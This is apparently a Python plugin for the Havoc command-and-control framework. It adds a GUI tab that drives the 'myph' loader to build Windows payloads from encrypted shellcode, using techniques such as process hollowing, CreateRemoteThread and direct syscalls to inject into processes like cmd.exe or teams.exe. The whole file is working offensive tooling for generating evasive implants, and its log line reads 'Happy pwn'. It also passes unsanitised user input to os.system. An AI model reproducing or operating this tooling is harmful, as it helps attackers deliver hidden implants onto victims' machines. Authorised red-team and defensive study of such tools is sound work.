#!/usr/bin/env python
# -*- Coding: UTF-8 -*-
# Author: @jenaye_fr & @djnn1337
# Created on: Mon, 17. Nov 2023
# Description: matro7sh myph Loader support for Havoc C2 framework
# Usage: Load this script into Havoc: Scripts -> Scripts Manager -> Load to create matro7sh Tab

import os
import shutil
import havoc  # type: ignore
import havocui  # type: ignore
from datetime import datetime

# Configuration
MYPH_LOADER_PATH = shutil.which("myph")
MYPH_EXEC_TECHNIQUES = ["CRT", "ProcessHollowing", "CreateThread", "Syscall"]
MYPH_ENCRYPT_TECHNIQUES = ["AES", "chacha20", "XOR", "blowfish"]

# Variables & Defaults
myph_shellcode_path = ""
myph_shellcode_encryption_key = ""
myph_shellcode_encryption_kind = "AES"
myph_target_process = "cmd.exe"
myph_shellcode_execution_technique = "CRT"
myph_output_path = "/tmp/myph.exe"

# Colors
HAVOC_ERROR = "#ff5555"  # Red
HAVOC_SUCCESS = "#50fa7b"  # Green
HAVOC_COMMENT = "#6272a4"  # Greyish blue
HAVOC_DARK = "#555766"  # Dark Grey
HAVOC_INFO = "#8be9fd"  # Cyan
HAVOC_WARNING = "#ffb86c"  # Orange

# Labels
myph_label_to_replace = f"<b style=\"color:{HAVOC_ERROR};\">No shellcode selected.</b>"
myph_label_execution_technique = ""

if not MYPH_LOADER_PATH:
    print("[-] Loader not found in $PATH")
    print("Please run script located in install/ directory :)")
    havocui.messagebox("Loader not found in: ", MYPH_LOADER_PATH)

# Create dialog and log widget
dialog = havocui.Dialog("Matro7sh Myph Payload Generator", True, 670, 400)
log = havocui.Logger("matro7sh myph Log")


def myph_change_shellcode_exec_method(num):
    global myph_shellcode_execution_technique
    if num:
        myph_shellcode_execution_technique = MYPH_EXEC_TECHNIQUES[num]
    else:
        myph_shellcode_execution_technique = "CRT"
    print("[*] Shellcode execution method changed: ", myph_shellcode_execution_technique)

    global myph_label_execution_technique
    warn_label = f"<b style=\"color:{HAVOC_WARNING};\">This method will not use the Process To Inject setting.</b>"
    techniques_to_warn = {
        "CreateThread": warn_label,
        "Syscall": warn_label,
        "ProcessHollowing": "",
        "CRT": "",
    }
    dialog.replaceLabel(myph_label_execution_technique, techniques_to_warn[myph_shellcode_execution_technique])
    myph_label_execution_technique = techniques_to_warn[myph_shellcode_execution_technique]


def myph_change_target_process(p):
    global myph_target_process
    myph_target_process = p
    print("[*] Target process: ", myph_target_process)


def myph_change_default_key(k):
    global myph_shellcode_encryption_key
    myph_shellcode_encryption_key = k
    print("[*] Key changed: ", myph_shellcode_encryption_key)

def myph_change_shellcode_encrypt_method(num):
    global myph_shellcode_encryption_kind
    if num:
        myph_shellcode_encryption_kind = MYPH_ENCRYPT_TECHNIQUES[num]
    else:
        myph_shellcode_encryption_kind = "AES"
    print("[*] Shellcode encryption method changed: ", myph_shellcode_encryption_kind)


def myph_change_shellcode_path():
    global myph_shellcode_path
    global myph_label_to_replace

    myph_shellcode_path = havocui.openfiledialog("Shellcode path").decode("ascii")
    print("[*] Shellcode path changed: ", myph_shellcode_path, ".")

    formatted_shellcode_path = f"<span style=\"color:{HAVOC_SUCCESS};\">{myph_shellcode_path}</span>"
    dialog.replaceLabel(myph_label_to_replace, formatted_shellcode_path)
    myph_label_to_replace = formatted_shellcode_path if myph_shellcode_path != " " \
        else f"<b style=\"color:{HAVOC_ERROR};\">No shellcode selected.</b>"


# Generate payload
def myph_run():
    def get_build_command() -> str:
        global myph_shellcode_path
        global myph_shellcode_encryption_key
        global myph_shellcode_execution_technique
        global myph_target_process
        global myph_shellcode_encryption_kind
        global myph_output_path

        myph_output_path = havocui.savefiledialog("Output Path").decode("ascii")
        print("[*] Output Path changed: ", myph_output_path, ".")

        base_cmd = f'{MYPH_LOADER_PATH}'
        if myph_shellcode_path != "":
            base_cmd = f'{base_cmd} --shellcode {myph_shellcode_path}'

        if myph_shellcode_encryption_kind != "":
            base_cmd = f'{base_cmd} --encryption {myph_shellcode_encryption_kind}'

        if myph_shellcode_encryption_key != "":
            base_cmd = f'{base_cmd} --key {myph_shellcode_encryption_key}'

        if myph_target_process != "":
            base_cmd = f'{base_cmd} --process {myph_target_process}'

        if myph_shellcode_execution_technique != "":
            base_cmd = f'{base_cmd} --technique {myph_shellcode_execution_technique}'

        base_cmd = f'{base_cmd} --out {myph_output_path}'
        print(f"[+] Command to be run: {base_cmd}")
        return base_cmd

    def execute():
        if myph_shellcode_encryption_key == "":
            log.addText(f"[<span style=\"color:{HAVOC_INFO};\">*</span>] No AES key provide it will be random one.")
        else:
            log.addText(f"[<span style=\"color:{HAVOC_INFO};\">*</span>] AES key provided = {myph_shellcode_encryption_key}.")

        cmd = get_build_command()

        os.system(cmd)

        # Create Log
        log.addText(f"Command has been be executed")
        log.addText(f"Check client log to see the output")
        log.addText(
            f"<b style=\"color:{HAVOC_SUCCESS};\">Payload generated successfully at {myph_output_path} using myph loader. Happy pwn</b>")
        log.setBottomTab()

    log.setBottomTab()
    log.addText(
        f"<b style=\"color:{HAVOC_DARK};\">───────────────────────────────────────── running myph ─────────────────────────────────────────</b>")
    log.addText(f"<b style=\"color:{HAVOC_COMMENT};\">{datetime.now().strftime('%d/%m/%Y %H:%M:%S')} </b>")

    global myph_shellcode_path
    if myph_shellcode_path == "":
        havocui.messagebox("Error", "Please specify a valid shellcode path.")
        log.addText(f"[<span style=\"color:{HAVOC_ERROR};\">-</span>] No shellcode file specified.")
        return

    execute()
    dialog.close()


def myph_loader_generator():
    def build():
        dialog.clear()

        # Get Listeners
        global listeners
        listeners = havoc.GetListeners()

        # Build Dialog
        dialog.addLabel(f"<b>──────────────────────────── Required Settings for Myph ─────────────────────────────</b>")
        dialog.addButton("Choose shellcode", myph_change_shellcode_path)
        dialog.addLabel(myph_label_to_replace)

        dialog.addLabel("<b>[*] Shellcode execution method</b>")
        dialog.addCombobox(myph_change_shellcode_exec_method, *MYPH_EXEC_TECHNIQUES)
        dialog.addLabel(myph_label_execution_technique)

        dialog.addLabel("<b>[*] Shellcode encryption method</b>")
        dialog.addCombobox(myph_change_shellcode_encrypt_method, *MYPH_ENCRYPT_TECHNIQUES)


        dialog.addLabel("<b>[*] Encryption key (Default: random)</b>")
        dialog.addLineedit("e.g. 0123456789ABCDEF1123345611111111", myph_change_default_key)

        dialog.addLabel("<b>[*] Process to inject to (Default: cmd.exe)</b>")
        dialog.addLineedit("e.g. teams.exe", myph_change_target_process)

        dialog.addButton("Generate", myph_run)
        dialog.exec()

    build()


# Create Tab
havocui.createtab("Matro7sh myph", "myph loader", myph_loader_generator)
